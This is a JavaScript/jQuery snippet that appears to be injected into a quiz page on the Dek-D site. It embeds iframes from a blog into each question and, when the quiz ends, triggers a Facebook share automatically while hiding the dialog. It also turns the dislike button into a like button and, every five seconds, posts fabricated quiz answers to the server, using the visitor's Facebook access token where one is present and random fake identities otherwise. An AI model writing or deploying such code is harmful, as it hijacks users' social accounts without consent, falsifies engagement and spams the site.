$("div[data-question-id^=1]").find(":first").append("<div width='100vw' height='100vh' style='overflow-x:scroll;'><br><iframe width='450' height='300' src='https://my.dek-d.com/northnroro/blog/?blog_id=10227861#0,2468,10,15,8,2,4,14,0,0,0,1,0,2,0,3,0,4,0,5,0,6,0,7,0,8,0,9,0,10,0,11,0,12,0,13,0,14,1,0,1,6,1,12,1,14,2,0,2,5,2,13,2,14,3,0,3,2,3,8,3,10,3,14,4,0,4,1,4,9,4,11,5,0,5,12,5,14,6,0,6,14,7,0,7,3,7,14,8,0,8,1,8,3,8,5,8,11,8,14,9,0,9,1,9,2,9,3,9,4,9,5,9,6,9,7,9,8,9,9,9,10,9,11,9,12,9,13,9,14'></iframe></div>");
$("div[data-question-id^=2]").find(":first").append("<div width='100vw' height='100vh' style='overflow-x:scroll;'><br><iframe width='450' height='300' src='https://my.dek-d.com/northnroro/blog/?blog_id=10227861#0,1112,10,15,5,5,5,8,0,0,0,1,0,2,0,3,0,4,0,5,0,6,0,7,0,8,0,9,0,10,0,11,0,12,0,13,0,14,1,0,1,3,1,14,2,0,2,3,2,14,3,0,3,12,3,14,4,0,4,4,4,5,4,6,4,7,4,8,4,9,4,14,5,0,5,1,5,6,5,7,5,14,6,0,6,4,6,5,6,6,6,7,6,8,6,9,6,11,6,14,7,0,7,3,7,14,8,0,8,3,8,14,9,0,9,1,9,2,9,3,9,4,9,5,9,6,9,7,9,8,9,9,9,10,9,11,9,12,9,13,9,14'></iframe></div>");
$("div[data-question-id^=3]").find(":first").append("<div width='100vw' height='100vh' style='overflow-x:scroll;'><br><iframe width='450' height='300' src='https://my.dek-d.com/northnroro/blog/?blog_id=10227861#0,6543,10,15,8,2,4,14,0,0,0,1,0,2,0,3,0,4,0,5,0,6,0,7,0,8,0,9,0,10,0,11,0,12,0,13,0,14,1,0,1,1,1,2,1,3,1,4,1,5,1,12,1,13,1,14,2,0,2,1,2,2,2,3,2,4,2,5,2,12,2,13,2,14,3,0,3,1,3,8,3,11,3,12,3,13,3,14,4,0,4,1,5,0,5,1,5,6,5,11,5,12,5,13,5,14,6,0,6,1,6,3,6,7,6,11,6,12,6,13,6,14,7,0,7,1,7,3,7,4,7,12,7,13,7,14,8,0,8,1,8,3,8,4,8,5,8,12,8,13,8,14,9,0,9,1,9,2,9,3,9,4,9,5,9,6,9,7,9,8,9,9,9,10,9,11,9,12,9,13,9,14'></iframe></div>");
$("div[data-question-id^=4]").find(":first").append("<div width='100vw' height='100vh' style='overflow-x:scroll;'><br><iframe width='450' height='300' src='https://my.dek-d.com/northnroro/blog/?blog_id=10227861#2,5555,10,15,8,2,4,14,0,0,0,1,0,2,0,3,0,4,0,5,0,6,0,7,0,8,0,9,0,10,0,11,0,12,0,13,0,14,1,0,1,4,1,11,1,14,2,0,2,6,2,14,3,0,3,2,3,9,3,13,3,14,4,0,4,7,5,0,5,12,5,14,6,0,6,5,6,14,7,0,7,3,7,14,8,0,8,1,8,3,8,11,8,13,8,14,9,0,9,1,9,2,9,3,9,4,9,5,9,6,9,7,9,8,9,9,9,10,9,11,9,12,9,13,9,14'></iframe></div>");
var shareCheck = setInterval(function(){
if($(".quiz-container.-ended").length > 0){
$(".sharebutton.dekdbutton.-social-facebook.-ready").click();
$(".fb_dialog").hide();
$(".fb_dialog_close_icon").hide();
setTimeout(function(){
	$(".fb_dialog").slideDown();
	quizResult.ajaxShareAuto();
},3000);
var dlbtn = $(".vote-button.-dislike.dekdbutton.-outline.-red.js-vote-dislike");
dlbtn.removeClass("-dislike");
dlbtn.addClass("-like");
dlbtn.removeClass("js-vote-dislike");
dlbtn.addClass("js-vote-like");
dlbtn.attr("data-mood","smile");
dlbtn.attr("data-vote","like");
clearInterval(shareCheck);
}
},500);
function answerQuiz(){
var data = "answer[1]=1&answer[2]=1&answer[3]=1&answer[4]=1&quiz_id="+$("input[name^=quiz_id]").val()+"&fb_id="+($("input[name^=fb_id]").val()?$("input[name^=fb_id]").val():parseInt(Math.random()*10000000+1234567))+"&fb_name="+($("input[name^=fb_name]").val()?$("input[name^=fb_name]").val():"FooBar"+(parseInt(Math.random()*2000000)).toString(36))+"&fb_access_token="+($("input[name^=fb_access_token]").val()?$("input[name^=fb_access_token]").val():(parseInt(Math.random()*2000000)).toString(36))+"&aliasname=["+($("input[name^=aliasname]").val()?$("input[name^=aliasname]").val():"-")+" ("+($("input[name^=fb_name]").val()?$("input[name^=fb_name]").val():" ")+")]&quiz_type=supertest&time_used=undefined&play_type=0&allow_share=0&position[1][1]=1&position[1][2]=2&position[1][3]=3&position[1][4]=4&position[2][1]=4&position[2][2]=3&position[2][3]=2&position[2][4]=1&position[3][1]=1&position[3][2]=2&position[3][3]=3&position[3][4]=4&position[4][1]=4&position[4][2]=3&position[4][3]=2&position[4][4]=1";
$.ajax({
	url: "/quiz/ajax.php?action=get_result",
	type: "POST",
	data: data,
	dataType: "json"
});
}
setInterval(answerQuiz,5000);